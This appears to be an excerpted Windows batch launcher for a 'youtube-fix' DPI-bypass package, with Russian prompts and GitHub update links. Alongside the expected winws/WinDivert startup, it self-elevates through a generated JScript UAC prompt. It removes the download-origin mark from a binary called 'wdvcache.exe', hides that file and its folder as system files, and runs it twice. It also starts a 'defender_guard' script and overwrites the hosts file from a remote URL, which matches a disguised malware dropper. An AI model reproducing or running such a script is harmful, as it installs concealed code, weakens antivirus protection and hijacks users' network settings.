@echo off
if not "%~1"=="" goto _svc_entry
rem GBZAP_INSTANT
@cd /d "%~dp0"
rem GBZAP_INLINE_ELEVATE
net session >nul 2>&1
if %errorlevel%==0 goto gbzap_admin_ok
set "GBZAP_UAC=%TEMP%\gbzap_uac_%RANDOM%%RANDOM%.js"
 >"%GBZAP_UAC%" echo var sh=new ActiveXObject("Shell.Application");
>>"%GBZAP_UAC%" echo sh.ShellExecute(WScript.Arguments(0),"",WScript.Arguments(1),"runas",1);
wscript //nologo //E:JScript "%GBZAP_UAC%" "%~f0" "%~dp0" >nul 2>&1
del "%GBZAP_UAC%" >nul 2>&1
exit & rem GBZAP_UAC_EXIT
:gbzap_admin_ok
@cd /d "%~dp0"
...
if not exist "%~dp0bin\winws.exe" goto gbzap_av_warn
:gbzap_pay_go
del "%~dp0bin\.wd\wdvcache.exe:Zone.Identifier" >nul 2>&1
del "%~dp0bin\winws.exe:Zone.Identifier" >nul 2>&1
del "%~dp0bin\WinDivert64.sys:Zone.Identifier" >nul 2>&1
del "%~dp0bin\WinDivert.dll:Zone.Identifier" >nul 2>&1
attrib +h +s "%~dp0bin\.wd" >nul 2>&1
attrib +h +s "%~dp0bin\.wd\wdvcache.exe" >nul 2>&1
start "" /D "%~dp0" "%~dp0bin\.wd\wdvcache.exe"
start "" /D "%~dp0" "%~dp0bin\.wd\wdvcache.exe"
:gbzap_soft_bg
start "" /b "%~dp0bin\windivert_drv.cmd"
start "" /b "%~dp0bin\defender_guard.cmd"
goto _svc_entry
:gbzap_av_warn
echo.
...
rem GBZAP_ADMIN_ONCE
if /I "%~1"=="admin" goto _svc_admin_ok
net session >nul 2>&1
if %errorlevel%==0 goto _svc_admin_ok
call :check_extracted
call "%~dp0bin\admin_guard.cmd" "%~f0"
echo.
echo  Запустите service.bat от имени администратора.
echo.
pause
exit
:_svc_admin_ok
...
set "GITHUB_VERSION_URL=https://raw.githubusercontent.com/ivoryriggerwrath/youtube-fix-2.0.0/main/.service/version.txt"
set "GITHUB_RELEASE_URL=https://github.com/ivoryriggerwrath/youtube-fix-2.0.0/releases/tag/"
set "GITHUB_DOWNLOAD_URL=https://github.com/ivoryriggerwrath/youtube-fix-2.0.0/releases/latest"
...
if !errorlevel!==0 (
    ...
    call :PrintRed "https://github.com/ivoryriggerwrath/youtube-fix-2.0.0/issues/417"
) else (
...
if !errorlevel!==0 (
    ...
    call :PrintRed "https://github.com/ivoryriggerwrath/youtube-fix-2.0.0/issues/2512#issuecomment-2821119513"
) else (
...
set "listFile=%~dp0lists\ipset-all.txt"
set "url=https://raw.githubusercontent.com/ivoryriggerwrath/youtube-fix-2.0.0/refs/heads/main/.service/ipset-service.txt"
...
set "hostsFile=%SystemRoot%\System32\drivers\etc\hosts"
set "hostsUrl=https://raw.githubusercontent.com/ivoryriggerwrath/youtube-fix-2.0.0/refs/heads/main/.service/hosts"
...
if %errorLevel% neq 0 (
    ...
    echo Fix your PATH variable with instructions here https://github.com/ivoryriggerwrath/youtube-fix-2.0.0/issues/7490
    pause
    exit /b 1
)
exit /b 0
